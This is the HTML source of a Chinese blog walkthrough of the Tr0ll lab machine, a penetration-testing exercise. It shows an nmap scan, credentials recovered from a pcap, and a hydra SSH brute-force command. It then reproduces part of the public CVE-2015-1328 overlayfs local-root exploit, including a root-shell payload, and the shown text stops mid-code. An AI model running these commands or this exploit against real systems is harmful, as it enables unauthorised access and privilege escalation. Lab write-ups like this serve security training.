@@ -1,0 +1,741 @@
+<!DOCTYPE html>
+<html>
+<head>
+    
+
+    
+
+    
+
+
+
+    <meta charset="utf-8">
+    
+    
+    
+    
+    <title>Tr0ll | yichen&#39;s blog</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="theme-color" content="#3F51B5">
+    
+    
+    <meta name="keywords" content="">
+    <meta name="description" content="nmap 扫一下端口：nmap -p- -A 192.168.149.174                                                                                              image.png               访问一下 80 端口，只有一张图片">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Tr0ll">
+<meta property="og:url" content="https://yichen115.github.io/2020/06/15/bgxup4/index.html">
+<meta property="og:site_name" content="yichen&#39;s blog">
+<meta property="og:description" content="nmap 扫一下端口：nmap -p- -A 192.168.149.174                                                                                              image.png               访问一下 80 端口，只有一张图片">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1592184461494-ae605e5d-29e9-4ed7-8e2a-c077c4be2f90.png#align=left&display=inline&height=512&margin=%5Bobject%20Object%5D&name=image.png&originHeight=910&originWidth=846&size=193301&status=done&style=none&width=476">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1592184748291-c7d99366-ed1c-4ec8-9191-021bdda02abb.png#align=left&display=inline&height=316&margin=%5Bobject%20Object%5D&name=image.png&originHeight=520&originWidth=526&size=259017&status=done&style=none&width=320">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1592184626574-ff3e274a-0dba-4627-aa50-b6f58b99f88d.png#align=left&display=inline&height=74&margin=%5Bobject%20Object%5D&name=image.png&originHeight=147&originWidth=521&size=12292&status=done&style=stroke&width=260.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1592184778266-683cd004-e5df-4655-b0c2-1ae6f30f3fcf.png#align=left&display=inline&height=290&margin=%5Bobject%20Object%5D&name=image.png&originHeight=580&originWidth=933&size=407023&status=done&style=none&width=466.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1592185153412-79be18d4-abeb-4380-9a14-4b77be6cece0.png#align=left&display=inline&height=298&margin=%5Bobject%20Object%5D&name=image.png&originHeight=465&originWidth=839&size=97316&status=done&style=none&width=537">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1592185496136-0f2e00e2-d972-4643-9453-47ad4f5fedb8.png#align=left&display=inline&height=471&margin=%5Bobject%20Object%5D&name=image.png&originHeight=942&originWidth=1184&size=116016&status=done&style=none&width=592">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1592186070836-b1e3e2be-4840-43c5-9e78-c399edb4a484.png#align=left&display=inline&height=268&margin=%5Bobject%20Object%5D&name=image.png&originHeight=536&originWidth=1416&size=105183&status=done&style=stroke&width=708">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1592186296892-712a49df-e90d-4ccd-904c-4abb20b7837b.png#align=left&display=inline&height=329&margin=%5Bobject%20Object%5D&name=image.png&originHeight=658&originWidth=1084&size=78499&status=done&style=stroke&width=542">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1592186426748-5172627e-a440-4c09-a6c3-30efc41b244c.png#align=left&display=inline&height=153&margin=%5Bobject%20Object%5D&name=image.png&originHeight=284&originWidth=588&size=26642&status=done&style=stroke&width=316">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1592186479230-71bf0c06-7127-4816-981f-eb6abdb19ddf.png#align=left&display=inline&height=450&margin=%5Bobject%20Object%5D&name=image.png&originHeight=901&originWidth=884&size=104627&status=done&style=stroke&width=442">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1592186665340-0609da38-6bdd-43da-bb7b-23e7ee455351.png#align=left&display=inline&height=52&margin=%5Bobject%20Object%5D&name=image.png&originHeight=44&originWidth=327&size=9812&status=done&style=none&width=389">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1592186724995-140bff39-45ec-4f15-8ccc-3a27b3edfb0e.png#align=left&display=inline&height=155&margin=%5Bobject%20Object%5D&name=image.png&originHeight=309&originWidth=754&size=31485&status=done&style=stroke&width=377">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1592187861524-784cd904-3f88-464e-b50c-c0bab40bcd5e.png#align=left&display=inline&height=188&margin=%5Bobject%20Object%5D&name=image.png&originHeight=366&originWidth=1449&size=710939&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1592188934192-c5497a70-3267-49a2-a8b4-edf8cd3e2fef.png#align=left&display=inline&height=52&margin=%5Bobject%20Object%5D&name=image.png&originHeight=69&originWidth=989&size=12946&status=done&style=none&width=746">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1592189467036-991a0654-86fa-49dd-9500-453f732ddef4.png#align=left&display=inline&height=110&margin=%5Bobject%20Object%5D&name=image.png&originHeight=219&originWidth=1495&size=54666&status=done&style=none&width=747.5">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1592189387876-4a3674eb-748b-4851-9bf9-e6c0fd5d38ac.png#align=left&display=inline&height=336&margin=%5Bobject%20Object%5D&name=image.png&originHeight=445&originWidth=422&size=46209&status=done&style=none&width=319">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1592190554083-cc0ae49c-ab19-46f1-a687-aa059d5466eb.png#align=left&display=inline&height=106&margin=%5Bobject%20Object%5D&name=image.png&originHeight=76&originWidth=259&size=6723&status=done&style=none&width=362">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1592190602004-9a764319-1fc5-4f79-ad2a-7a36611dd7e8.png#align=left&display=inline&height=419&margin=%5Bobject%20Object%5D&name=image.png&originHeight=594&originWidth=562&size=141755&status=done&style=none&width=396">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1592190645289-8fcd1fc2-e6e8-4952-bc7c-b41c3ee18c6b.png#align=left&display=inline&height=148&margin=%5Bobject%20Object%5D&name=image.png&originHeight=172&originWidth=348&size=13648&status=done&style=none&width=300">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1592192457043-fa575715-280d-44fb-b05c-abd2323e7c51.png#align=left&display=inline&height=305&margin=%5Bobject%20Object%5D&name=image.png&originHeight=610&originWidth=1222&size=227094&status=done&style=none&width=611">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1592192686042-7044623b-c401-4fcd-a00c-eea7b765d5b0.png#align=left&display=inline&height=310&margin=%5Bobject%20Object%5D&name=image.png&originHeight=444&originWidth=661&size=65145&status=done&style=none&width=462">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1592192732851-20b11e55-8a2b-47c5-9742-98e1793b24be.png#align=left&display=inline&height=90&margin=%5Bobject%20Object%5D&name=image.png&originHeight=130&originWidth=543&size=44789&status=done&style=none&width=377">
+<meta property="og:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1592193213034-5c073be7-c154-4122-ab36-50219646c2f2.png#align=left&display=inline&height=439&margin=%5Bobject%20Object%5D&name=image.png&originHeight=676&originWidth=691&size=126613&status=done&style=none&width=449">
+<meta property="article:published_time" content="2020-06-15T01:27:34.000Z">
+<meta property="article:modified_time" content="2022-10-03T13:52:43.681Z">
+<meta property="article:author" content="yichen">
+<meta property="article:tag" content="网络安全 CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://cdn.nlark.com/yuque/0/2020/png/268938/1592184461494-ae605e5d-29e9-4ed7-8e2a-c077c4be2f90.png#align=left&display=inline&height=512&margin=%5Bobject%20Object%5D&name=image.png&originHeight=910&originWidth=846&size=193301&status=done&style=none&width=476">
+    
+        <link rel="alternate" type="application/atom+xml" title="yichen&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/favicon.ico">
+    <link rel="stylesheet" href="//unpkg.com/hexo-theme-material-indigo@latest/css/style.css">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" style="background-image:url(/img/brand.jpg)">
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.png">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">yichen</h5>
+          <a href="mailto:1097179511@qq.com" title="1097179511@qq.com" class="mail">1097179511@qq.com</a>
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="waves-block waves-effect">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                主页
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://www.yuque.com/hxfqg9" target="_blank" rel="noopener"  >
+                <i class="icon icon-lg icon-grav"></i>
+                语雀
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://passport.kanxue.com/user-center-837755.htm" target="_blank" >
+                <i class="icon icon-lg icon-snowflake-o"></i>
+                看雪
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="http://sighttp.qq.com/msgrd?v=1&uin=1097179511" target="_blank" >
+                <i class="icon icon-lg icon-qq"></i>
+                QQ
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://img2020.cnblogs.com/blog/1558534/202003/1558534-20200331231408805-256812285.jpg" target="_blank" >
+                <i class="icon icon-lg icon-wechat"></i>
+                微信
+              </a>
+            </li>
+        
+            <li class="waves-block waves-effect">
+              <a href="https://github.com/yichen115" target="_blank" >
+                <i class="icon icon-lg icon-github"></i>
+                Github
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">Tr0ll</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="输入感兴趣的关键字">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menuShare">
+            <i class="icon icon-lg icon-share-alt"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+
+    <div class="container fade-scale">
+        <h1 class="title">Tr0ll</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2020-06-15T01:27:34.000Z" itemprop="datePublished" class="page-time">
+  2020-06-15
+</time>
+
+
+            
+        </h5>
+    </div>
+
+    
+
+
+</header>
+<meta name="referrer" content="no-referrer" />
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap post-toc-shrink" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#overlayfs-本地提权"><span class="post-toc-number">1.</span> <span class="post-toc-text">overlayfs 本地提权</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#计划任务提权"><span class="post-toc-number">2.</span> <span class="post-toc-text">计划任务提权</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#反弹-shell"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">反弹 shell</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#覆盖-ssh"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">覆盖 ssh</span></a></li></ol></li></ol>
+        </nav>
+    </aside>
+
+
+<article id="post-bgxup4"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">Tr0ll</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2020-06-15 09:27:34" datetime="2020-06-15T01:27:34.000Z"  itemprop="datePublished">2020-06-15</time>
+
+            
+
+
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>
+</span>
+
+
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>nmap 扫一下端口：<br><code>nmap -p- -A 192.168.149.174</code></p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1592184461494-ae605e5d-29e9-4ed7-8e2a-c077c4be2f90.png#align=left&display=inline&height=512&margin=%5Bobject%20Object%5D&name=image.png&originHeight=910&originWidth=846&size=193301&status=done&style=none&width=476" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>访问一下 80 端口，只有一张图片</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1592184748291-c7d99366-ed1c-4ec8-9191-021bdda02abb.png#align=left&display=inline&height=316&margin=%5Bobject%20Object%5D&name=image.png&originHeight=520&originWidth=526&size=259017&status=done&style=none&width=320" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>访问了一下 robots.txt 得到了一个 /secret 目录</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1592184626574-ff3e274a-0dba-4627-aa50-b6f58b99f88d.png#align=left&display=inline&height=74&margin=%5Bobject%20Object%5D&name=image.png&originHeight=147&originWidth=521&size=12292&status=done&style=stroke&width=260.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>去访问一下仍然只有一张图片</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1592184778266-683cd004-e5df-4655-b0c2-1ae6f30f3fcf.png#align=left&display=inline&height=290&margin=%5Bobject%20Object%5D&name=image.png&originHeight=580&originWidth=933&size=407023&status=done&style=none&width=466.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>之前 nmap 扫端口的时候，说了可以匿名登录 ftp<br>以及还有个流量包 lol.pcap</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1592185153412-79be18d4-abeb-4380-9a14-4b77be6cece0.png#align=left&display=inline&height=298&margin=%5Bobject%20Object%5D&name=image.png&originHeight=465&originWidth=839&size=97316&status=done&style=none&width=537" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>直接连接上去</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1592185496136-0f2e00e2-d972-4643-9453-47ad4f5fedb8.png#align=left&display=inline&height=471&margin=%5Bobject%20Object%5D&name=image.png&originHeight=942&originWidth=1184&size=116016&status=done&style=none&width=592" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>从这个流量包里面拿到了 ftp 的一组用户名和密码 anonymous/password</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1592186070836-b1e3e2be-4840-43c5-9e78-c399edb4a484.png#align=left&display=inline&height=268&margin=%5Bobject%20Object%5D&name=image.png&originHeight=536&originWidth=1416&size=105183&status=done&style=stroke&width=708" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>还有这样一组信息</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1592186296892-712a49df-e90d-4ccd-904c-4abb20b7837b.png#align=left&display=inline&height=329&margin=%5Bobject%20Object%5D&name=image.png&originHeight=658&originWidth=1084&size=78499&status=done&style=stroke&width=542" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>Well, well, well, aren’t you just a clever little devil, you almost found the sup3rs3cr3tdirlol :-P\n<br>去访问一下目录试试</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1592186426748-5172627e-a440-4c09-a6c3-30efc41b244c.png#align=left&display=inline&height=153&margin=%5Bobject%20Object%5D&name=image.png&originHeight=284&originWidth=588&size=26642&status=done&style=stroke&width=316" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>这竟然是一个 ELF 文件，执行一下试试</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1592186479230-71bf0c06-7127-4816-981f-eb6abdb19ddf.png#align=left&display=inline&height=450&margin=%5Bobject%20Object%5D&name=image.png&originHeight=901&originWidth=884&size=104627&status=done&style=stroke&width=442" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>又得到一个路径 0x0856BF，再去访问一下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1592186665340-0609da38-6bdd-43da-bb7b-23e7ee455351.png#align=left&display=inline&height=52&margin=%5Bobject%20Object%5D&name=image.png&originHeight=44&originWidth=327&size=9812&status=done&style=none&width=389" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1592186724995-140bff39-45ec-4f15-8ccc-3a27b3edfb0e.png#align=left&display=inline&height=155&margin=%5Bobject%20Object%5D&name=image.png&originHeight=309&originWidth=754&size=31485&status=done&style=stroke&width=377" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>good_luck 目录中有个 txt，作为用户名<br>this_folder_contains_the_password 目录中有个 pass.txt<br>然而这个文件名就是 password</p>
+<p>爆破一下 ssh<br>hydra -L user.txt -w 10 -P pass.txt -t 10 -v 192.168.149.174 ssh<br>-L user.txt     指定爆破账号字典为 user.txt<br>-w 10             设置最大超时时间 10s，默认 30s<br>-P pass.txt     指定密码字典为 pass.txt<br>-t 10               指定爆破线程为 10 个<br>-v                   指定显示爆破过程</p>
+<p>拿到一对：overflow/Pass.txt</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1592187861524-784cd904-3f88-464e-b50c-c0bab40bcd5e.png#align=left&display=inline&height=188&margin=%5Bobject%20Object%5D&name=image.png&originHeight=366&originWidth=1449&size=710939&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>几种提权方法：</p>
+<h1 id="overlayfs-本地提权"><a href="#overlayfs-本地提权" class="headerlink" title="overlayfs 本地提权"></a>overlayfs 本地提权</h1><p>查看内核版本：uname -a</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1592188934192-c5497a70-3267-49a2-a8b4-edf8cd3e2fef.png#align=left&display=inline&height=52&margin=%5Bobject%20Object%5D&name=image.png&originHeight=69&originWidth=989&size=12946&status=done&style=none&width=746" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>直接搜一下提权的脚本</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="https://cdn.nlark.com/yuque/0/2020/png/268938/1592189467036-991a0654-86fa-49dd-9500-453f732ddef4.png#align=left&display=inline&height=110&margin=%5Bobject%20Object%5D&name=image.png&originHeight=219&originWidth=1495&size=54666&status=done&style=none&width=747.5" alt="image.png" title="">
+                </div>
+                <div class="image-caption">image.png</div>
+            </figure>
+
+<p>复制出来 cp /usr/share/exploitdb/exploits/linux/local/37292.c hack.c<br>在目标机器上复制上，然后编译好 gcc hack.c -o hack</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"><span class="comment"># Exploit Title: ofs.c - overlayfs local root in ubuntu</span></span><br><span class="line"><span class="comment"># Date: 2015-06-15</span></span><br><span class="line"><span class="comment"># Exploit Author: rebel</span></span><br><span class="line"><span class="comment"># Version: Ubuntu 12.04, 14.04, 14.10, 15.04 (Kernels before 2015-06-15)</span></span><br><span class="line"><span class="comment"># Tested on: Ubuntu 12.04, 14.04, 14.10, 15.04</span></span><br><span class="line"><span class="comment"># CVE : CVE-2015-1328     (http://people.canonical.com/~ubuntu-security/cve/2015/CVE-2015-1328.html)</span></span><br><span class="line"></span><br><span class="line">*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*</span><br><span class="line">CVE<span class="number">-2015</span><span class="number">-1328</span> / ofs.c</span><br><span class="line">overlayfs incorrect permission handling + FS_USERNS_MOUNT</span><br><span class="line"></span><br><span class="line">user@ubuntu-server<span class="number">-1504</span>:~$ uname -a</span><br><span class="line">Linux ubuntu-server<span class="number">-1504</span> <span class="number">3.19</span><span class="number">.0</span><span class="number">-18</span>-generic <span class="comment">#18-Ubuntu SMP Tue May 19 18:31:35 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux</span></span><br><span class="line">user@ubuntu-server<span class="number">-1504</span>:~$ gcc ofs.c -o ofs</span><br><span class="line">user@ubuntu-server<span class="number">-1504</span>:~$ id</span><br><span class="line">uid=<span class="number">1000</span>(user) gid=<span class="number">1000</span>(user) groups=<span class="number">1000</span>(user),<span class="number">24</span>(cdrom),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev)</span><br><span class="line">user@ubuntu-server<span class="number">-1504</span>:~$ ./ofs</span><br><span class="line">spawning threads</span><br><span class="line">mount <span class="comment">#1</span></span><br><span class="line">mount <span class="comment">#2</span></span><br><span class="line">child threads done</span><br><span class="line">/etc/ld.so.preload created</span><br><span class="line">creating shared library</span><br><span class="line"><span class="comment"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root),<span class="number">24</span>(cdrom),<span class="number">30</span>(dip),<span class="number">46</span>(plugdev),<span class="number">1000</span>(user)</span><br><span class="line"></span><br><span class="line">greets to beist &amp; kaliman</span><br><span class="line"><span class="number">2015</span><span class="number">-05</span><span class="number">-24</span></span><br><span class="line">%rebel%</span><br><span class="line">*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*=*</span><br><span class="line">*/</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sched.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mount.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;stdlib.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sched.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/stat.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/mount.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;signal.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;fcntl.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;linux/sched.h&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#define LIB "#include &lt;unistd.h&gt;\n\nuid_t(*_real_getuid) (void);\nchar path[128];\n\nuid_t\ngetuid(void)\n&#123;\n_real_getuid = (uid_t(*)(void)) dlsym((void *) -1, \"getuid\");\nreadlink(\"/proc/self/exe\", (char *) &amp;path, 128);\nif(geteuid() == 0 &amp;&amp; !strcmp(path, \"/bin/su\")) &#123;\nunlink(\"/etc/ld.so.preload\");unlink(\"/tmp/ofs-lib.so\");\nsetresuid(0, 0, 0);\nsetresgid(0, 0, 0);\nexecle(\"/bin/sh\", \"sh\", \"-i\", NULL, NULL);\n&#125;\n    return _real_getuid();\n&#125;\n"</span></span><br><span class="line"></span><br><span class="line">static char child_stack[<span class="number">1024</span>*<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line">static int</span><br><span class="line">child_exec(void *stuff)</span><br><span class="line">&#123;</span><br><span class="line">    char *file;</span><br><span class="line">    system(<span class="string">"rm -rf /tmp/ns_sploit"</span>);</span><br><span class="line">    mkdir(<span class="string">"/tmp/ns_sploit"</span>, <span class="number">0777</span>);</span><br><span class="line">    